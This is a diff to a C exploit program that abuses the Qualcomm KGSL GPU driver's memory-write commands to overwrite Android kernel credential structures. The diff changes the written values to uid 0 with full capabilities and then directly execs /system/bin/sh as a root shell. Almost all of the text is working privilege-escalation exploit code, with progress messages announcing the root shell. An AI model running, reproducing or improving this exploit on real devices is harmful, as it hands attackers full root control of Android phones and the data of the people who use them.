@@ -625,13 +625,7 @@ int main(int argc, char **argv) {
     }
 
     if (n_cred > 0) {
-        printf("[*] Phase 8b: Writing uid/gid = current process values + full caps to %d cred pages\n", n_cred);
-        uid_t ruid, euid, suid;
-        gid_t rgid, egid, sgid;
-        getresuid(&ruid, &euid, &suid);
-        getresgid(&rgid, &egid, &sgid);
-        uint32_t id_vals[8] = { ruid, rgid, suid, sgid, euid, egid, euid, egid };
-
+        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
         for (int p = 0; p < n_cred && p < 32; p++) {
             uint64_t cbase = cred_pages[p] + cred_offs[p];
@@ -677,7 +671,7 @@ int main(int argc, char **argv) {
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
             cmd[dw++] = zl; cmd[dw++] = zh;
 
-            for (int i = 0; i < 8; i++) cmd[dw++] = id_vals[i];
+            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
 
             cmd[dw++] = 0x00000004;
 
@@ -699,8 +693,8 @@ int main(int argc, char **argv) {
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t uid = *(volatile uint32_t*)dst_m;
-            printf("  CRED[%d]: uid=0x%08X %s (expected 0x%08X)\n", p, uid,
-                uid == id_vals[0] ? "OK" : "FAIL", id_vals[0]);
+            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
+                uid == 0 ? "OK" : "FAIL");
 
             flush_dc_civac_range((void*)cred_pages[p], 0x1000);
         }
@@ -748,46 +742,15 @@ int main(int argc, char **argv) {
     }
     sleep(1);
 
-    printf("[*] Phase 9: Waiting for root shell...\n");
-    printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
+    printf("[*] Phase 9: Spawning root shell (uid=0)...\n");
+    printf("  current uid=%u euid=%u\n", getuid(), geteuid());
     fflush(stdout);
 
-    close(notify_pipe[1]);
-    sleep(1);
-    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
-    pid_t winner = 0;
-    ssize_t r = read(notify_pipe[0], &winner, sizeof(winner));
-    if (r != sizeof(winner)) {
-        if (poll(&pfd, 1, 10000) > 0 &&
-            read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
-        } else {
-            int fd = open("/data/local/tmp/rooted", O_RDONLY);
-            if (fd >= 0) {
-                char c;
-                if (read(fd, &c, 1) == 1 && c == '1') {
-                    winner = 1;
-                }
-                close(fd);
-            }
-        }
-    }
-
-    if (winner > 0) {
-        printf("[+] ROOT! uid=0 at PID %d\n", winner);
-        for (int i = 0; i < n_spray; i++)
-            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
-        while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
-        fflush(stdout);
-        waitpid(winner, NULL, 0);
-        printf("[-] Root shell exited\n");
-    } else {
-        printf("[-] No child got uid=0\n");
-    }
-    close(notify_pipe[0]);
+    execl("/system/bin/sh", "sh", NULL);
+    perror("execl failed");
+    printf("[-] Shell spawn failed, exiting\n");
 
     for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
     while (wait(NULL) > 0);
-    printf("[*] Done. Goodbye.\n");
     return 0;
 }
